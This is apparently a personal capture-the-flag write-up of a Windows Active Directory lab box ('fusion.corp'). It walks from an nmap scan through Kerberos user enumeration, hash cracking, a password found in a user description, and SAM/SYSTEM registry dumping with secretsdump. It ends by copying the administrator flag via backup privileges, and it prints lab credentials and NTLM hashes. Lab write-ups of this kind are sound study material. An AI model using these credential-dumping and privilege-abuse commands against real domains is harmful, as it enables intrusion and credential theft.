Started with a nmap scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: eBusiness Bootstrap Template
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-15 01:43:14Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-14T01:28:07
| Not valid after:  2026-05-16T01:28:07
| MD5:   e98e:c841:12ef:f2af:8682:4d80:cac2:10bb
| SHA-1: 6046:a59f:836e:6ac3:89a4:215b:2732:5a4d:742b:4f0a
|_ssl-date: 2025-11-15T01:44:43+00:00; +52s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-15T01:44:03+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49819/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Domain `fusion.corp` Hostname `FUSION-DC` 
Starting with the DNS did not find any subdomains so going to the LDAP and SMB null accounts don't work and guest account is disabled so moving to the webhost looking at the site its kinda static there is a contact forum that sends a POST request to a file that don't exist and the sign up buttons go no were going to run a subdomain scan and see if there is anything I don't think there is tho did not find any 
Moving on to the Kerberos we can try some username enumeration `/opt/kerbrute userenum jsmith.txt -d fusion.corp --dc 10.201.64.118` and we got some usernames and one with a kerberos ticket
```
Administrator
jmurphy
lparker
```
so we can use hashcat to crack the hash `hashcat lparker rockyou.txt` and it cracked to `lparker:!!abbylvzsvs2k6!` so now checking with this login we have smb access but no special shares dumping the users we got them all from the enum but there is a password in the description of the `jmurphy` user 
```
SMB         10.201.3.117    445    FUSION-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.201.3.117    445    FUSION-DC        Administrator                 2021-03-04 16:13:07 0       Built-in account for administering the computer/domain 
SMB         10.201.3.117    445    FUSION-DC        Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.201.3.117    445    FUSION-DC        krbtgt                        2021-03-03 12:43:43 0       Key Distribution Center Service Account 
SMB         10.201.3.117    445    FUSION-DC        lparker                       2021-03-03 13:37:40 0        
SMB         10.201.3.117    445    FUSION-DC        jmurphy                       2021-03-03 13:41:24 0       Password set to u8WC3!kLsgw=#bRY
```
`jmurphy:u8WC3!kLsgw=#bRY` stepping back a little bit the `lparker` user has the flag so also getting bloodhound data and lets now see what `jmurphy` has he has the second flag with is a high value target and apart of backup operators we c an save the `SYSTEM` and the `SAM` file 
```
reg save HKLM\SYSTEM system
reg save HKLM\SAM sam
```
and then we can use Impacket to dump it `impacket-secretsdump -sam sam -system system LOCAL`
```
[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
so the hash is not working but we do have backup privilege and winrm access so we can import 
```
SeBackupPrivilegeUtils.dll
SeBackupPrivilegeCmdLets.dll
```
and then run `Copy-FileSebackupPrivilege C:\Users\Administrator\Desktop\flag.txt flag.txt` and now we have the flag 